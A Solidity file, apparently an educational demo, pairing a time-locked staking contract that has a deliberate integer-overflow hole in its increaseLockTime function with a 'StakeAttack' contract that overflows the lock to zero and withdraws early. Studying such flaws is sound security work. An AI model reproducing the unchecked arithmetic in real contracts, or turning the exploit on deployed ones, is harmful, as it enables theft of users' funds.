//SPDX-License-Identifier: No-License
pragma solidity ^0.7.0;

contract Stake {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function increaseLockTime(uint _lockTime) external {
        lockTime[msg.sender] += _lockTime;
    }

    function deposit() external payable {
        require(msg.value > 0);
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function withdraw(address _to, uint _amount) external {
        require(balances[msg.sender] >= _amount, "Not sufficiant balance");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        balances[msg.sender] -= _amount;
        (bool success, ) = payable(_to).call{value: _amount}("");
        require(success, "Transfer failed");
    }
}

contract StakeAttack {
    Stake public stake;

    constructor(address _stake) {
        stake = Stake(_stake);
    }

    receive() external payable {}
    
    function attack(address _to, uint _amount) payable external {
        require(msg.value > 0);
        require(_amount <= msg.value, "Not sufficiant balance");
        stake.deposit{value: msg.value}();
        stake.increaseLockTime(
            type(uint).max + 1 - stake.lockTime(address(this))
        );
        stake.withdraw(_to, _amount);
    }

    function getBalance() external view returns(uint) {
        return address(this).balance;
    }

}